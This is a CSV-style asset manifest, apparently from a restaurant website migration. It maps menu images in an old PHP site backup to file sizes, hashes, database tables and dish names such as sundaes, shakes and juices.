140.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/140.jpeg,7669,fa4d481752bdc7bc7801f9106faa6c20b638ced816afa610b72037a782d278e8,5c180f7e63936651b3563ec423436e81,DB Mapped (Verified),menu_item_tbl,140,Pine Apple Sundae,menu_img
140.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/140.jpeg,7669,fa4d481752bdc7bc7801f9106faa6c20b638ced816afa610b72037a782d278e8,5c180f7e63936651b3563ec423436e81,DB Mapped (Verified),menu_item_tbl,140,Pine Apple Sundae,menu_small_img
141.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/141.jpg,12444,a4d1e6fd32dcb11c1805af040118345b4e83d787fb4349b6c1bf85513b4e4432,f6e8c472da88613089fc32ad1afedd42,DB Mapped (Verified),menu_item_tbl,141,Strawberry Sundae,menu_img
141.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/141.jpg,12444,a4d1e6fd32dcb11c1805af040118345b4e83d787fb4349b6c1bf85513b4e4432,f6e8c472da88613089fc32ad1afedd42,DB Mapped (Verified),menu_item_tbl,141,Strawberry Sundae,menu_small_img
142.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/142.jpg,23366,7f88888b24a4f13d8ae83a5a0c7780c3697ef1bb3ea067dfe952639e103b6298,e1a08a5fd3c9c418103ff8afc0a7889a,DB Mapped (Verified),menu_item_tbl,142,Cocktail Sundae,menu_img
142.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/142.jpg,23366,7f88888b24a4f13d8ae83a5a0c7780c3697ef1bb3ea067dfe952639e103b6298,e1a08a5fd3c9c418103ff8afc0a7889a,DB Mapped (Verified),menu_item_tbl,142,Cocktail Sundae,menu_small_img
143.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/143.jpeg,11533,df56393535e8b4191a58a03d734cb4efa3ac9d21925098d06e4c76d094704444,cce2859ec6ebc971e3f16d5020569347,DB Mapped (Verified),menu_item_tbl,143,Himalayan Queen,menu_img
143.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/143.jpeg,11533,df56393535e8b4191a58a03d734cb4efa3ac9d21925098d06e4c76d094704444,cce2859ec6ebc971e3f16d5020569347,DB Mapped (Verified),menu_item_tbl,143,Himalayan Queen,menu_small_img
144.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/144.jpeg,10974,73f217d244a73bb88e7958939895b8398880db99ef3823190b7256d3f7a83de5,691fc6c515da19506f2eff1715d6ca73,DB Mapped (Verified),menu_item_tbl,144,Orange Crunch,menu_img
144.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/144.jpeg,10974,73f217d244a73bb88e7958939895b8398880db99ef3823190b7256d3f7a83de5,691fc6c515da19506f2eff1715d6ca73,DB Mapped (Verified),menu_item_tbl,144,Orange Crunch,menu_small_img
145.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/145.jpeg,6307,e228d22fb26462e25327f917c683a6245e96ea716d4f0bfdbf95f3f84f36e487,2d72d6f7ba5460c67982af491dba4fa1,DB Mapped (Verified),menu_item_tbl,145,Kesar Badam,menu_img
146.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/146.jpg,8011,1ae71de6fa5b5f26904cb5f41c0b903f3e081447612349b8005aeef7620870ec,c0f55f638435192fc5acc87107d2b796,DB Mapped (Verified),menu_item_tbl,146,Strawberry,menu_img
147.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/147.jpg,40941,547415841f861cf84ec65721627e26ab98d47f973f7086d4256091af80dbcdc9,45c281d08d39fb40bb9d9b1c9a04f9cd,DB Mapped (Verified),menu_item_tbl,147,Badshahi Gulab,menu_img
147.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/147.jpg,40941,547415841f861cf84ec65721627e26ab98d47f973f7086d4256091af80dbcdc9,45c281d08d39fb40bb9d9b1c9a04f9cd,DB Mapped (Verified),menu_item_tbl,147,Badshahi Gulab,menu_small_img
148.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/148.jpeg,6860,d8faea01fc1c173cbf719880dab13a2ebb0dbadc3ed1f4841b8a296a00528372,2bf5327e3981305dbc3e4f56343ef73c,DB Mapped (Verified),menu_item_tbl,148,Vanilla,menu_img
148.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/148.jpeg,6860,d8faea01fc1c173cbf719880dab13a2ebb0dbadc3ed1f4841b8a296a00528372,2bf5327e3981305dbc3e4f56343ef73c,DB Mapped (Verified),menu_item_tbl,148,Vanilla,menu_small_img
149.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/149.jpeg,8557,e5de28920e29d25df45c720f6587ee27d405a0c08785da8b3dd23bd8a7e3e0a4,0410f9e52f320f33b6bdbdb6055684ee,DB Mapped (Verified),menu_item_tbl,149,Pine Apple,menu_img
149.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/149.jpeg,8557,e5de28920e29d25df45c720f6587ee27d405a0c08785da8b3dd23bd8a7e3e0a4,0410f9e52f320f33b6bdbdb6055684ee,DB Mapped (Verified),menu_item_tbl,149,Pine Apple,menu_small_img
15.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/15.jpeg,12401,b92087b551fe3e61b6296363c20dde53f13f05639050518182a437d93ea832f6,90f3a9aa0644da109e97301f7fe4077a,DB Mapped (Verified),menu_item_tbl,15,Soya Chaap (Gravy),menu_img
150.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/150.jpeg,6307,e228d22fb26462e25327f917c683a6245e96ea716d4f0bfdbf95f3f84f36e487,2d72d6f7ba5460c67982af491dba4fa1,DB Mapped (Verified),menu_item_tbl,150,Kesar Badam,menu_img
150.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/150.jpeg,6307,e228d22fb26462e25327f917c683a6245e96ea716d4f0bfdbf95f3f84f36e487,2d72d6f7ba5460c67982af491dba4fa1,DB Mapped (Verified),menu_item_tbl,150,Kesar Badam,menu_small_img
151.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/151.jpeg,10535,02301194d3c3d6f6583405751a0263845772ad637150aaba5f93982923ce8c6d,edf2cf651611e23e52c3b3091c967439,DB Mapped (Verified),menu_item_tbl,151,Kaju Anjeer,menu_img
151.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/151.jpeg,10535,02301194d3c3d6f6583405751a0263845772ad637150aaba5f93982923ce8c6d,edf2cf651611e23e52c3b3091c967439,DB Mapped (Verified),menu_item_tbl,151,Kaju Anjeer,menu_small_img
152.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/152.jpg,8011,1ae71de6fa5b5f26904cb5f41c0b903f3e081447612349b8005aeef7620870ec,c0f55f638435192fc5acc87107d2b796,DB Mapped (Verified),menu_item_tbl,152,Strawberry,menu_img
152.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/152.jpg,8011,1ae71de6fa5b5f26904cb5f41c0b903f3e081447612349b8005aeef7620870ec,c0f55f638435192fc5acc87107d2b796,DB Mapped (Verified),menu_item_tbl,152,Strawberry,menu_small_img
153.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/153.jpg,84853,96b8c1215b0693fbc2fefc6cb67bc63facea4037e268617af84cca476b29d4da,932b50de261ea98415234af7dd0a9d7e,DB Mapped (Verified),menu_item_tbl,153,Black Current,menu_img
153.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/153.jpg,84853,96b8c1215b0693fbc2fefc6cb67bc63facea4037e268617af84cca476b29d4da,932b50de261ea98415234af7dd0a9d7e,DB Mapped (Verified),menu_item_tbl,153,Black Current,menu_small_img
154.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/154.jpg,25820,a0260ca4ef8f1834d5451ecd24d582010f8815f2f4c9a57a561a19fa3cc21ad0,97bab0717936767039cd4be6ea8ee8ee,DB Mapped (Verified),menu_item_tbl,154,Khajoor Shake,menu_img
154.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/154.jpg,25820,a0260ca4ef8f1834d5451ecd24d582010f8815f2f4c9a57a561a19fa3cc21ad0,97bab0717936767039cd4be6ea8ee8ee,DB Mapped (Verified),menu_item_tbl,154,Khajoor Shake,menu_small_img
155.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/155.jpg,10457,8a01839ef38801602e5c3147e6d6a53ed4dff1622793490f900e4256c4bf1527,34aa3a5e6f2a4d20bf7700740439fe22,DB Mapped (Verified),menu_item_tbl,155,Cold Coffee,menu_img
155.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/155.jpg,10457,8a01839ef38801602e5c3147e6d6a53ed4dff1622793490f900e4256c4bf1527,34aa3a5e6f2a4d20bf7700740439fe22,DB Mapped (Verified),menu_item_tbl,155,Cold Coffee,menu_small_img
156.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/156.jpg,64446,f4024ba432f6c379daf8f5342999cb99e9a6677e66e2c14e61e1665a861c811d,6b1ee7229ee82d7f5bb79e3cb75dedbe,DB Mapped (Verified),menu_item_tbl,156,Badam Shake,menu_img
156.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/156.jpg,64446,f4024ba432f6c379daf8f5342999cb99e9a6677e66e2c14e61e1665a861c811d,6b1ee7229ee82d7f5bb79e3cb75dedbe,DB Mapped (Verified),menu_item_tbl,156,Badam Shake,menu_small_img
157.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/157.jpeg,9604,2d9679d16d4ddfbf05937a42c53c88f639cf28f92ed2c3b4e61550c15322ab81,fbfa079190fad1cb0db44390a20668cb,DB Mapped (Verified),menu_item_tbl,157,Kesaria Thandai,menu_img
157.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/157.jpeg,9604,2d9679d16d4ddfbf05937a42c53c88f639cf28f92ed2c3b4e61550c15322ab81,fbfa079190fad1cb0db44390a20668cb,DB Mapped (Verified),menu_item_tbl,157,Kesaria Thandai,menu_small_img
158.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/158.jpg,16170,00737a80de90a55288db3f8b8a8f544601928d21d6c233d43e89773558e1cc50,674944548f7ef767198ac330c647411a,DB Mapped (Verified),menu_item_tbl,158,Pista Shake,menu_img
158.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/158.jpg,16170,00737a80de90a55288db3f8b8a8f544601928d21d6c233d43e89773558e1cc50,674944548f7ef767198ac330c647411a,DB Mapped (Verified),menu_item_tbl,158,Pista Shake,menu_small_img
159.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/159.jpg,13142,70691390ad6d49a0470214e10a31f483a397de9e9966b9089db00b124ae7bf0b,1f170965b164e422a024829758d27763,DB Mapped (Verified),menu_item_tbl,159,Khus Shake,menu_img
159.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/159.jpg,13142,70691390ad6d49a0470214e10a31f483a397de9e9966b9089db00b124ae7bf0b,1f170965b164e422a024829758d27763,DB Mapped (Verified),menu_item_tbl,159,Khus Shake,menu_small_img
16.webp,old-website-php/Full-website-backup/frontEnd/menuimg/16.webp,63704,befd6065aad292e0dc2fc74abfea6495e4fd8320360b4b6b6cb97a5f27e0e417,21f03c992b42791daad53abecb115f3e,DB Mapped (Verified),menu_item_tbl,16,Kadhai Paneer,menu_img
160.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/160.jpg,11209,ef6067e1822c933097f98c6d06f3684c153f75e287a1912e381e240059d3fb2a,9c791c7e94e1f154127e64c6222a3bf5,DB Mapped (Verified),menu_item_tbl,160,Mango Lassi,menu_img
160.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/160.jpg,11209,ef6067e1822c933097f98c6d06f3684c153f75e287a1912e381e240059d3fb2a,9c791c7e94e1f154127e64c6222a3bf5,DB Mapped (Verified),menu_item_tbl,160,Mango Lassi,menu_small_img
161.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/161.jpg,5285,527e30de88af2e13de1cd6737d93fb66a224495e11d03e620f766875a8889185,f7bcde7a2ee24c464f4b0e51970d8d16,DB Mapped (Verified),menu_item_tbl,161,Cheecoo Shake,menu_img
161.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/161.jpg,5285,527e30de88af2e13de1cd6737d93fb66a224495e11d03e620f766875a8889185,f7bcde7a2ee24c464f4b0e51970d8d16,DB Mapped (Verified),menu_item_tbl,161,Cheecoo Shake,menu_small_img
162.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/162.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,162,Mango Shake,menu_img
162.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/162.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,162,Mango Shake,menu_small_img
163.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/163.jpg,10685,b6c220ceebe439993aef857f4fc6bd92f4015c862a761004c412845aa5bf9fac,cb3d5b5ed0255c0d7c98703c6e9d0c63,DB Mapped (Verified),menu_item_tbl,163,Choco Shake,menu_img
163.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/163.jpg,10685,b6c220ceebe439993aef857f4fc6bd92f4015c862a761004c412845aa5bf9fac,cb3d5b5ed0255c0d7c98703c6e9d0c63,DB Mapped (Verified),menu_item_tbl,163,Choco Shake,menu_small_img
164.webp,old-website-php/Full-website-backup/frontEnd/menuimg/164.webp,29166,a5ab683e866f385c0c4c979b4e5104aa28a87fa1f996cab5d09af80fc2b025b5,343cc40c083fc3c6d6b240f3ef25ae06,DB Mapped (Verified),menu_item_tbl,164,Banana Shake,menu_img
164.webp,old-website-php/Full-website-backup/frontEnd/menuimg/164.webp,29166,a5ab683e866f385c0c4c979b4e5104aa28a87fa1f996cab5d09af80fc2b025b5,343cc40c083fc3c6d6b240f3ef25ae06,DB Mapped (Verified),menu_item_tbl,164,Banana Shake,menu_small_img
165.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/165.jpeg,5928,5c1b1ebbac9b1cdf55d3be22e0e6a3e631a4994b74453fae3dd77e7dd4df4bfd,6728b7d776f5d6c60cf39c387828af47,DB Mapped (Verified),menu_item_tbl,165,Fruit Shake,menu_img
165.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/165.jpeg,5928,5c1b1ebbac9b1cdf55d3be22e0e6a3e631a4994b74453fae3dd77e7dd4df4bfd,6728b7d776f5d6c60cf39c387828af47,DB Mapped (Verified),menu_item_tbl,165,Fruit Shake,menu_small_img
166.webp,old-website-php/Full-website-backup/frontEnd/menuimg/166.webp,55818,2b1cefef794be7245f441276f12ac062e230c6f270419e6624d02de5824615bd,4881bd299fc6e33d5ab033af573ba7c1,DB Mapped (Verified),menu_item_tbl,166,Thandai,menu_img
166.webp,old-website-php/Full-website-backup/frontEnd/menuimg/166.webp,55818,2b1cefef794be7245f441276f12ac062e230c6f270419e6624d02de5824615bd,4881bd299fc6e33d5ab033af573ba7c1,DB Mapped (Verified),menu_item_tbl,166,Thandai,menu_small_img
167.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/167.jpg,62666,0e4c9b09c6f5ec3844012f30043f06a81dc4ac51e6a08d7291187ef308c4e2d5,3b3f25ab54be2e33e2cbf36bf4354dd7,DB Mapped (Verified),menu_item_tbl,167,Khajoor,menu_img
167.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/167.jpg,62666,0e4c9b09c6f5ec3844012f30043f06a81dc4ac51e6a08d7291187ef308c4e2d5,3b3f25ab54be2e33e2cbf36bf4354dd7,DB Mapped (Verified),menu_item_tbl,167,Khajoor,menu_small_img
168.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/168.jpg,11237,efd482e3feeb2e111a60f77f5b13f6d39358db481c7ad66b1497f31805a1f7e9,5dbd83b5410e150a004098ae0aa29fab,DB Mapped (Verified),menu_item_tbl,168,Lassi,menu_img
168.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/168.jpg,11237,efd482e3feeb2e111a60f77f5b13f6d39358db481c7ad66b1497f31805a1f7e9,5dbd83b5410e150a004098ae0aa29fab,DB Mapped (Verified),menu_item_tbl,168,Lassi,menu_small_img
169.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/169.jpeg,8805,f290c7bfcaad3c1186c6abe55e5e205e7ea39dfe58c42d4f810aa05d64639f71,0ff37f25ca609a104c761c4068b6a6f4,DB Mapped (Verified),menu_item_tbl,169,Mix Fruits,menu_img
169.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/169.jpeg,8805,f290c7bfcaad3c1186c6abe55e5e205e7ea39dfe58c42d4f810aa05d64639f71,0ff37f25ca609a104c761c4068b6a6f4,DB Mapped (Verified),menu_item_tbl,169,Mix Fruits,menu_small_img
17.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/17.jpeg,13207,4a578f0e959543a2260f7b2984d1f3d50eba9d501ee61a25263af7c6f742c27e,78d3b652d265893ac5ef2bcf2cca167b,DB Mapped (Verified),menu_item_tbl,17,Mix Veg,menu_img
170.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/170.jpg,18463,78e27a9be89d69a86cd7edf7f60d32403b3b2cf26ff0d436fd3ef606e0a69c22,316eb7e3d8704b15bb1026e44c526f20,DB Mapped (Verified),menu_item_tbl,170,Fresh Juice,menu_img
170.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/170.jpg,18463,78e27a9be89d69a86cd7edf7f60d32403b3b2cf26ff0d436fd3ef606e0a69c22,316eb7e3d8704b15bb1026e44c526f20,DB Mapped (Verified),menu_item_tbl,170,Fresh Juice,menu_small_img
171.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/171.jpeg,3840,80c7172e95060546790ea5d31ce87838a93c953926fb326bf792e0371b655c08,28b8f190bd0a1488fde0697f7029bf2e,DB Mapped (Verified),menu_item_tbl,171,Coconut Water,menu_img
171.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/171.jpeg,3840,80c7172e95060546790ea5d31ce87838a93c953926fb326bf792e0371b655c08,28b8f190bd0a1488fde0697f7029bf2e,DB Mapped (Verified),menu_item_tbl,171,Coconut Water,menu_small_img
172.png,old-website-php/Full-website-backup/frontEnd/menuimg/172.png,85435,a151035bff8ca925d797fa2efea9613abe8097eed5b794e14e963c0f2607e373,bdc96ed01ebc4a812226bbef4a315578,DB Mapped (Verified),menu_item_tbl,172,Guava Juice,menu_img
172.png,old-website-php/Full-website-backup/frontEnd/menuimg/172.png,85435,a151035bff8ca925d797fa2efea9613abe8097eed5b794e14e963c0f2607e373,bdc96ed01ebc4a812226bbef4a315578,DB Mapped (Verified),menu_item_tbl,172,Guava Juice,menu_small_img
173.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/173.jpg,11462,63833af9faac7f633e8f7d3e411081c14754bb8324eb69f012ef173980246b73,8cea1fedf5283aba8e37c278adab3f07,DB Mapped (Verified),menu_item_tbl,173,Papita Juice,menu_img
173.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/173.jpg,11462,63833af9faac7f633e8f7d3e411081c14754bb8324eb69f012ef173980246b73,8cea1fedf5283aba8e37c278adab3f07,DB Mapped (Verified),menu_item_tbl,173,Papita Juice,menu_small_img
174.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/174.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,174,Mango Juice,menu_img
174.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/174.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,174,Mango Juice,menu_small_img
175.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/175.jpg,15666,570fea4cf18dc020d39f18a447c363e2cfbe93b3e1bbe86dbf4055de1dd5ef55,c9bc65073e2a142cb804a0a72ed69f7e,DB Mapped (Verified),menu_item_tbl,175,Plum Juice,menu_img
175.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/175.jpg,15666,570fea4cf18dc020d39f18a447c363e2cfbe93b3e1bbe86dbf4055de1dd5ef55,c9bc65073e2a142cb804a0a72ed69f7e,DB Mapped (Verified),menu_item_tbl,175,Plum Juice,menu_small_img
176.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/176.jpg,12005,a43b890fab3f401370245c33f4fc9a00e72fee4a58faea6c6c3ef1c7ad5cbb25,48cf8f92a3a7830ba345ad6618e19d2c,DB Mapped (Verified),menu_item_tbl,176,Water Melon Juice,menu_img
176.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/176.jpg,12005,a43b890fab3f401370245c33f4fc9a00e72fee4a58faea6c6c3ef1c7ad5cbb25,48cf8f92a3a7830ba345ad6618e19d2c,DB Mapped (Verified),menu_item_tbl,176,Water Melon Juice,menu_small_img
177.webp,old-website-php/Full-website-backup/frontEnd/menuimg/177.webp,43226,734867f9bbffea8d4f94723c98be4148af6afed1c5667faa888627ae9ea5a54a,a86ab29839cc7ff75c724d47a799481e,DB Mapped (Verified),menu_item_tbl,177,Falsa Juice,menu_img
177.webp,old-website-php/Full-website-backup/frontEnd/menuimg/177.webp,43226,734867f9bbffea8d4f94723c98be4148af6afed1c5667faa888627ae9ea5a54a,a86ab29839cc7ff75c724d47a799481e,DB Mapped (Verified),menu_item_tbl,177,Falsa Juice,menu_small_img
178.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/178.jpeg,4959,da68eb8a35b1d6ee8581c89e58fd42caa794b0e86d0094b3dd9a6de41bf4817e,5ec828ff595ea8a2d1a0440cf57f87cb,DB Mapped (Verified),menu_item_tbl,178,Kiwi Juice,menu_img
178.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/178.jpeg,4959,da68eb8a35b1d6ee8581c89e58fd42caa794b0e86d0094b3dd9a6de41bf4817e,5ec828ff595ea8a2d1a0440cf57f87cb,DB Mapped (Verified),menu_item_tbl,178,Kiwi Juice,menu_small_img
179.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/179.jpg,165712,97bf8a18199c46c7625ef6e8dfb30c9adbc99cc4fd3ea55eaf2e5299946b5e95,a10da67799f415aad9a31988cc7e46da,DB Mapped (Verified),menu_item_tbl,179,Tutti Frooti,menu_img
179.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/179.jpg,165712,97bf8a18199c46c7625ef6e8dfb30c9adbc99cc4fd3ea55eaf2e5299946b5e95,a10da67799f415aad9a31988cc7e46da,DB Mapped (Verified),menu_item_tbl,179,Tutti Frooti,menu_small_img
18.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/18.jpg,94574,58ae6bb5007db22629a983c6d554fbec12f036df0b5ebc4493f899087f3873b8,68ed08ef1cd71bd9ed802fe29904884a,DB Mapped (Verified),menu_item_tbl,18,Aloo Gobhi,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/18.jpg,94574,58ae6bb5007db22629a983c6d554fbec12f036df0b5ebc4493f899087f3873b8,68ed08ef1cd71bd9ed802fe29904884a,DB Mapped (Verified),product_item_tbl,18,Desi Ghee Patisha,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/18.jpg,94574,58ae6bb5007db22629a983c6d554fbec12f036df0b5ebc4493f899087f3873b8,68ed08ef1cd71bd9ed802fe29904884a,DB Mapped (Verified),website_gallery,18,event at noida,gimage
18.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/18.jpg,94574,58ae6bb5007db22629a983c6d554fbec12f036df0b5ebc4493f899087f3873b8,68ed08ef1cd71bd9ed802fe29904884a,DB Mapped (Verified),worke_work_experience,18,reakfast Dishes by2,workproimg
180.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/180.jpeg,4450,2cda43f8a6cdc6d6d2205bd4f173c2bdaa108b0bfc91b5d9965b2126780f9d72,adf0688d3450216b6b71f025ede6a92a,DB Mapped (Verified),menu_item_tbl,180,Ice Cream With Soda,menu_img
180.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/180.jpeg,4450,2cda43f8a6cdc6d6d2205bd4f173c2bdaa108b0bfc91b5d9965b2126780f9d72,adf0688d3450216b6b71f025ede6a92a,DB Mapped (Verified),menu_item_tbl,180,Ice Cream With Soda,menu_small_img
181.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/181.jpg,9632,55eeb1ffd33c6957bf50b20edeb7c5812022a04d43bd3cf51875ccd69ba2a01f,9ec8e53f6134a6016fa56d85f567adaf,DB Mapped (Verified),menu_item_tbl,181,Rusburry,menu_img
181.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/181.jpg,9632,55eeb1ffd33c6957bf50b20edeb7c5812022a04d43bd3cf51875ccd69ba2a01f,9ec8e53f6134a6016fa56d85f567adaf,DB Mapped (Verified),menu_item_tbl,181,Rusburry,menu_small_img
182.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/182.jpeg,8525,7fb7641ee1189b611fa3dde92e12876dbd7af701a1e07b236c2088ba8240d1de,bc675648460d4f015d71dde626f8cf13,DB Mapped (Verified),menu_item_tbl,182,Khumani,menu_img
182.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/182.jpeg,8525,7fb7641ee1189b611fa3dde92e12876dbd7af701a1e07b236c2088ba8240d1de,bc675648460d4f015d71dde626f8cf13,DB Mapped (Verified),menu_item_tbl,182,Khumani,menu_small_img
183.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/183.jpeg,8520,0b5bcdc60fddaf314196edc138df3214a5431d7147fad3f6ab69985c8aa25f08,f0fabfcc95da432dea587ae79e3a04a9,DB Mapped (Verified),menu_item_tbl,183,Grapes Juice,menu_img
183.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/183.jpeg,8520,0b5bcdc60fddaf314196edc138df3214a5431d7147fad3f6ab69985c8aa25f08,f0fabfcc95da432dea587ae79e3a04a9,DB Mapped (Verified),menu_item_tbl,183,Grapes Juice,menu_small_img
184.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/184.jpg,75417,35d552deb3ea6b8848111d7c5a50168eeeb3c19de0aa986067a956281e4d55e3,61ad346164406e2b372a885a7a06feaf,DB Mapped (Verified),menu_item_tbl,184,Full Green Salad,menu_img
184.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/184.jpg,75417,35d552deb3ea6b8848111d7c5a50168eeeb3c19de0aa986067a956281e4d55e3,61ad346164406e2b372a885a7a06feaf,DB Mapped (Verified),menu_item_tbl,184,Full Green Salad,menu_small_img
185.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/185.jpg,179160,51ef716d660ab575ebd2e9725c2e5afa614687467adb8322a87b82769d8de8d3,127b545dc96c98efe6ccf094fd86ff2c,DB Mapped (Verified),menu_item_tbl,185,Masala Onion Ring,menu_img
185.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/185.jpg,179160,51ef716d660ab575ebd2e9725c2e5afa614687467adb8322a87b82769d8de8d3,127b545dc96c98efe6ccf094fd86ff2c,DB Mapped (Verified),menu_item_tbl,185,Masala Onion Ring,menu_small_img
186.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/186.jpg,163337,b3e0e16e6b1ad34a2fb884d624e9ec7ee00a41ab63e19487832e67b124723a99,6982ffc8a0a83eb2430820b311de0b1f,DB Mapped (Verified),menu_item_tbl,186,Mixed Achar,menu_img
186.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/186.jpg,163337,b3e0e16e6b1ad34a2fb884d624e9ec7ee00a41ab63e19487832e67b124723a99,6982ffc8a0a83eb2430820b311de0b1f,DB Mapped (Verified),menu_item_tbl,186,Mixed Achar,menu_small_img
187.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/187.jpeg,59166,f04d80ca51c3083d2620436d9b72fcb8833e8f3e8c426b6c52f1a41b9b5c4a09,5b35c221c069e1a2bcc258c7359ba1be,DB Mapped (Verified),menu_item_tbl,187,Murabba,menu_img
187.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/187.jpeg,59166,f04d80ca51c3083d2620436d9b72fcb8833e8f3e8c426b6c52f1a41b9b5c4a09,5b35c221c069e1a2bcc258c7359ba1be,DB Mapped (Verified),menu_item_tbl,187,Murabba,menu_small_img
188.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/188.jpg,46496,43c7dd3c46dc0aba3c4121f445b93258a3bd5ae03fb804f34911662e227735c4,ffa38abeb0d5b2992af98f383e4d486c,DB Mapped (Verified),menu_item_tbl,188,Fresh Indian Fruits,menu_img
188.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/188.jpg,46496,43c7dd3c46dc0aba3c4121f445b93258a3bd5ae03fb804f34911662e227735c4,ffa38abeb0d5b2992af98f383e4d486c,DB Mapped (Verified),menu_item_tbl,188,Fresh Indian Fruits,menu_small_img
189.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/189.jpg,24706,73c93c424dff728e1699de376155d720ea031d26d53a0cc4583d9954d26f6846,74e6ae25b062f5b505c417ac1d6b45ab,DB Mapped (Verified),menu_item_tbl,189,Sirka Payaz,menu_img
189.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/189.jpg,24706,73c93c424dff728e1699de376155d720ea031d26d53a0cc4583d9954d26f6846,74e6ae25b062f5b505c417ac1d6b45ab,DB Mapped (Verified),menu_item_tbl,189,Sirka Payaz,menu_small_img
